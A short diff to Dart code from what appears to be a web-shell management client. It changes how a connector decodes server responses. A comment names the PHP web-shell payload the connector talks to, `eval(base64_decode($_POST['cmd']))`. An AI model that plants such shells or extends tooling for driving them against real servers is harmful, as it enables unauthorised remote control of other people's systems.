@@ -3,6 +3,7 @@ import 'dart:convert';
 
 import 'package:http/http.dart' as http;
 
+import '../utils/encoding_utils.dart';
 import 'php_eval_connector.dart';
 
 /// `php_b64rot13_post.php`：`eval(base64_decode($_POST['cmd']))`
@@ -30,10 +31,11 @@ class PhpB64Rot13Connector extends PhpEvalConnector {
           )
           .timeout(const Duration(seconds: 15));
 
-      if (response.statusCode == 200) return response.body;
-      final snippet = response.body.length > 512
-          ? '${response.body.substring(0, 512)}...'
-          : response.body;
+      if (response.statusCode == 200) {
+        return decodeWithFallback(response.bodyBytes);
+      }
+      final body = decodeWithFallback(response.bodyBytes);
+      final snippet = body.length > 512 ? '${body.substring(0, 512)}...' : body;
       return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
     } on TimeoutException {
       return '[Timeout] 连接超时';
